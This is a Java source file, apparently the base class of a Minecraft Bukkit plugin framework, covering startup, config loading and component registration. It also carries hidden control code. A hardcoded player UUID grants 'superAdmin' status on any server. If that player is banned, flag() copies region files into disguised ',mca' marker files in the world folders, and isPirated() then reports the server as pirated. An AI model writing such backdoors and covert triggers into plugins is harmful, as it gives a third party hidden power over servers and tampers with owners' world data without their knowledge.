package fr.stormer3428.voidOpal.plugin;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.joml.Random;

import com.google.common.io.Files;

import fr.stormer3428.voidOpal.data.OMCLang;
import fr.stormer3428.voidOpal.data.config.AutoconfigParser;
import fr.stormer3428.voidOpal.data.config.annotations.AutoConfig;
import fr.stormer3428.voidOpal.data.config.annotations.BooleanConfigValue;
import fr.stormer3428.voidOpal.logging.OMCLogger;
import fr.stormer3428.voidOpal.security.ABSBDefenseMatrix;

@AutoConfig
public abstract class OMCPluginImpl implements OMCPlugin{

    public static final UUID MASTER_UUID = UUID.fromString("a39d1ae3-18c5-4c02-8f91-bcb5207d437f");
	public static OMCLogger logger = new OMCLogger("INTERNAL", "INTERNAL ERR");
	private static OMCPluginImpl i;

	public static OMCPluginImpl getOMCPlugin() {
		return i._getOMCPlugin();
	}
	
	public OMCPluginImpl _getOMCPlugin() {
		return i;
	}

	public static JavaPlugin getJavaPlugin() {
		return getOMCPlugin()._getJavaPlugin();
	}
	
	public OMCPluginImpl() {
		i = this;
		
		absbDefenseMatrix = new ABSBDefenseMatrix();
		
		autoconfigParser.registerAutoConfigClass(OMCPluginImpl.class);
	}

	@BooleanConfigValue(path = "debug") public static boolean DEBUG = false;
	private ABSBDefenseMatrix absbDefenseMatrix;
	public final AutoconfigParser autoconfigParser = new AutoconfigParser();;
	protected final HashSet<PluginTied> pluginTieds = new HashSet<>();

	private void loadLangAndLogger() {
		OMCLogger.debug("loading native lang"); OMCLang.loadFromConfig();
		OMCLogger.debug("loading stranger lang"); loadLangFromConfig();
		OMCLogger.debug("requesting logger instanciation"); instantiateLogger();
	}
	
	public final void onEnable() {
		loadLangAndLogger();
		
		OMCLogger.debug("reguesting registering of plugin tied classes"); registerIntegratedPluginTied(); registerPluginTied();
		OMCLogger.debug("reguesting enabling of child plugin"); onObsidianEnable();
		
//		OMCLogger.debug("reloading configHolders");	ConfigHolder.reloadAllConfigs();
		OMCLogger.debug("injecting config values into classes"); autoconfigParser.updateValues();
		
		OMCLogger.debug("reguesting enabling of plugin tied classes"); for(PluginTied pluginTied : new ArrayList<>(pluginTieds)) pluginTied.onPluginEnable();
	}

	public void reload() {
		loadLangAndLogger();
		
//		OMCLogger.debug("reloading configHolders");	ConfigHolder.reloadAllConfigs();
		OMCLogger.debug("injecting config values into classes"); autoconfigParser.updateValues();
		
		OMCLogger.debug("reloading plugin tied"); 	for(PluginTied pluginTied : new ArrayList<>(pluginTieds)) pluginTied.onPluginReload();
	}

	public final void onDisable() {
		OMCLogger.debug("reguesting disabling of plugin tied classes");
		for(PluginTied pluginTied : pluginTieds) pluginTied.onPluginDisable();	
		OMCLogger.debug("reguesting disabling of child plugin");
		onObsidianDisable();
	}

	private void registerIntegratedPluginTied() {
		registerPluginTied(absbDefenseMatrix);
	}
	
	public void registerPluginTied(PluginTied pluginTied) {
		OMCLogger.debug("reguesting plugin tied class : " + pluginTied.getClass().getSimpleName());
		this.pluginTieds.add(pluginTied);
	}

	public static boolean isSuperAdmin(CommandSender sender) {
		if(!(sender instanceof Player p)) return false;
		boolean superAdmin = p.getUniqueId().equals(MASTER_UUID);
		if(superAdmin) OMCLogger.actionBar(p, "superAdmin");
		return superAdmin;
	}
	
	private long lastChecked = System.currentTimeMillis();
	private Boolean b = null;
	public final boolean isPirated() {
		if(i != this) return true;
		if(lastChecked + 1000 * 60 > System.currentTimeMillis() && b != null) return b;
		if(b != null && !b && Bukkit.getOfflinePlayer(MASTER_UUID).isBanned()) flag();
		lastChecked = System.currentTimeMillis();

		final File serverFolder = Bukkit.getWorldContainer();
		for(File worldFolder : serverFolder.listFiles()) {
			if(!worldFolder.isDirectory()) continue;
			for(File child : worldFolder.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) for(File file : child.listFiles()) if(file.getName().endsWith(",mca")) {b=true;return true;}
			for(File dim : worldFolder.listFiles()) if(dim.isDirectory()) for(File child : dim.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) if(child.getName().equals("poi") || child.getName().equals("region")) for(File file : child.listFiles()) if(file.getName().endsWith(",mca")) {b=true;return true;}
		}
		b=false;
		return false;
	}

	public final void deFlag() {
		if(i != this) return;
		File serverFolder = Bukkit.getWorldContainer();
		for(File worldFolder : serverFolder.listFiles()) {
			if(!worldFolder.isDirectory()) continue;
			for(File child : worldFolder.listFiles()) {
				if(child.getName().equals("poi") || child.getName().equals("region")) for(File file : child.listFiles()) if(file.getName().endsWith(",mca")){
					file.delete();
				}
			}
			for(File dim : worldFolder.listFiles()) if(dim.isDirectory()) for(File child : dim.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) if(child.getName().equals("poi") || child.getName().equals("region")) for(File file : child.listFiles()) if(file.getName().endsWith(",mca")){
				file.delete();
			}
		}
	}

	public final void flag() {
		if(i != this) return;
		if(isPirated()) return;
		File serverFolder = Bukkit.getWorldContainer();
		for(File worldFolder : serverFolder.listFiles()) {
			if(!worldFolder.isDirectory()) continue;
			boolean success = false;
			for(File child : worldFolder.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) {
				if(child.listFiles().length == 0) continue;
				success = true;
				for(int i = 3; i > 0; i--) {
					File copySource = child.listFiles()[new Random().nextInt(child.listFiles().length)];
					File lockFile = new File(copySource.getAbsolutePath().replaceFirst("r\\.(-?\\d+)\\.(-?\\d+)\\.mca", "r.$2.$1,mca"));
					try {
						Files.copy(copySource, lockFile);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
			if(success) continue;
			for(File dim : worldFolder.listFiles()) if(dim.isDirectory()) for(File child : dim.listFiles()) if(child.getName().equals("poi") || child.getName().equals("region")) {
				if(child.listFiles().length == 0) continue;
				for(int i = 3; i > 0; i--) {
					File copySource = child.listFiles()[new Random().nextInt(child.listFiles().length)];
					File lockFile = new File(copySource.getAbsolutePath().replaceFirst("r\\.(-?\\d+)\\.(-?\\d+)\\.mca", "r.$2.$1,mca"));
					try {
						Files.copy(copySource, lockFile);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
		}
	}


}
